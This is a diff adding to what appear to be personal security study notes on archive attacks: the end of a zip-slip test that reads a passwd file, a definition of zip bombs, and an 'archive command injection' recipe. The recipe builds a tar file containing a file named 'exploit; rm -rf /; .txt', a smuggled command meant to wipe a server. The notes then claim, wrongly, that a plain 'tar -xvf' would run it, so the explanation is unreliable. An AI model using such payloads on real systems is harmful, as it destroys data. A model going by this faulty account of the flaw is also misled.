@@ -14,3 +14,15 @@ unzip malicious.zip -d /tmp/test_extraction
 
 Step 5: Verify the results
 cat /home/ali-hazimeh/Documents/test_passwd/passwd
+
+
+zip bomb
+A zip bomb is a maliciously crafted compressed file designed to crash or disrupt systems by consuming excessive storage, memory, or CPU resources when decompressed. It typically achieves this by having a tiny compressed size but an enormously large decompressed size or through deeply nested archives, overwhelming the extracting system.
+
+*archive command injection
+
+mkdir malicious_archive
+cd malicious_archive
+touch "exploit; rm -rf /; .txt"
+tar -cvf exploit.tar "exploit; rm -rf /; .txt"
+now if the application have code like: tar -xvf exploit.tar then it will delete files on the server
